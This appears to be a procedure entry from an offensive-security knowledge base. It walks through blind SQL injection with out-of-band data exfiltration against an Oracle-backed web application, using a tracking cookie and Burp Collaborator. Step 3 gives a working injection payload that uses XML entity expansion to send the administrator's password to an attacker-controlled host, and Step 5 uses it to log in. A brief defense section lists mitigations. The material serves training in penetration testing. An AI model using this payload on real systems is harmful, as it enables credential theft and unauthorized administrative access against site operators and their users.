---
id: e42ac8f4-cac7-4cf3-82df-c5ad5f68f927
name: Blind-SQL-Out-Of-Band-Data-Exfiltration
type: procedure
verified: true
submitted: true
created_at: '2020-08-18T14:59:11.505897+00:00'
updated_at: '2023-05-26T01:34:08.855471+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/blind SQL]]'
  - '[[tags/data exfiltration]]'
  - '[[tags/Web Applications]]'
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Blind-SQL-Out-Of-Band-Data-Exfiltration

## Summary

This procedure demonstrates how to perform out-of-band (OOB) data exfiltration in a blind SQL injection vulnerability by crafting an asynchronous SQL query that triggers an external HTTP request to an attacker-controlled server, such as Burp Collaborator, without relying on response differences in the application itself. It is particularly useful when in-band exfiltration is blocked or unreliable, allowing extraction of sensitive data like user passwords from the database.

## Description

Blind SQL injection occurs when an application executes SQL queries based on user input but does not reveal database errors or data in responses, making traditional inference techniques time-consuming. Out-of-band exfiltration bypasses this by forcing the database to make an external network request containing the stolen data. This procedure targets web applications vulnerable to SQLi in cookie values (e.g., TrackingId), using Oracle-specific XML entity expansion to encode and send data via HTTP to a collaborator server. The technique assumes the database server can make outbound HTTP connections and is effective against labs or real-world e-commerce sites with tracking cookies. Prerequisites include a SQLi vulnerability confirmed via error-based or time-based tests. Expected outcomes include successful extraction of database contents, enabling further access like administrator login.

## Requirements

1. Burp Suite Professional (for Collaborator functionality; Community edition lacks full OOB support).
2. Access to the vulnerable web application with a confirmed blind SQLi in a parameter like a cookie.
3. Network position allowing interception of HTTP requests (e.g., proxy setup in browser).
4. Attacker-controlled domain for receiving exfiltrated data (Burp Collaborator provides this).
5. Basic knowledge of SQL syntax and URL encoding.

## Defense

Defensive measures and detection strategies:

- Implement parameterized queries or prepared statements to prevent SQL injection entirely.
- Use web application firewalls (WAFs) to detect anomalous SQL patterns in inputs, including entity expansions.
- Monitor outbound network traffic from database servers for unexpected DNS or HTTP requests to unknown domains.
- Enable database logging for SQL queries and audit for suspicious UNION SELECT or XML operations.
- Restrict database server outbound connections to only trusted endpoints via network segmentation.

## Objectives

1. Confirm blind SQLi vulnerability and craft an OOB exfiltration payload.
2. Trigger external data transmission without alerting the application.
3. Capture and decode exfiltrated data to access sensitive information like user credentials.
4. Use extracted data to achieve unauthorized access, such as logging in as an administrator.

## Instructions

### Step 1: Intercept and Isolate Vulnerable Request

**Context**: Begin by capturing the HTTP request containing the vulnerable parameter (e.g., TrackingId cookie) to set up for payload injection. This ensures you can modify the request in a controlled environment without affecting the live application.

Use Burp Suite's Proxy to intercept traffic from the browser. Navigate to the application's front page (e.g., shop homepage) and forward the request to Repeater for manipulation.

> No specific command; this is a GUI action in [[tools/Burp-Suite]]. Expected: Request appears in Repeater with the original TrackingId cookie value.

### Step 2: Initialize Burp Collaborator

**Context**: Start the Collaborator client to generate a unique subdomain for receiving exfiltrated data. This acts as the C2 server for the OOB channel, polling for incoming interactions.

In Burp Suite, navigate to the Collaborator tab and click "Copy to clipboard" to get your unique collaborator URL. Then, open the Collaborator client window and prepare to poll for interactions.

> Note: Burp Collaborator requires Professional edition. Expected: A unique URL like `abc123.burpcollaborator.net` is generated and ready for use.

### Step 3: Craft and Inject OOB SQL Payload

**Context**: Modify the vulnerable cookie to include a SQL payload that uses XML entity expansion to asynchronously fetch an external resource containing the target data (e.g., administrator password). This exploits the database's ability to make HTTP requests during query execution.

Replace the TrackingId value with the following payload, substituting `YOUR-SUBDOMAIN-HERE` with your Collaborator subdomain:

Reference the payload: [[codes/Blind-SQL-OOB-Exfiltration-via-XML-Entity]]

In Burp Repeater, update the cookie header:

```
Cookie: TrackingId=x' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [+<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/" + (SELECT password FROM users WHERE username='administrator') + ".YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %xxe;]>'),'/l') FROM dual--
```

Send the modified request.

> Why: The XML entity (%xxe) triggers an HTTP request to the Collaborator URL concatenated with the password, exfiltrating it out-of-band. Expected: Application responds normally (no visible data), but an external request is triggered.

### Step 4: Poll for Exfiltrated Data

**Context**: Check the Collaborator client for incoming interactions, which will reveal the exfiltrated data in the subdomain or request body.

In the Burp Collaborator client, click "Poll now" to query for new interactions.

> Expected: An HTTP or DNS interaction appears, with the subdomain or path containing the administrator's password (e.g., subdomain `passwordvalue.burpcollaborator.net`).

### Step 5: Utilize Exfiltrated Data

**Context**: Apply the extracted credentials to gain access, verifying the success of the exfiltration.

Navigate to the application's login page (e.g., Account login) and enter the username `administrator` with the exfiltrated password.

> Expected: Successful authentication and access to privileged functionality.
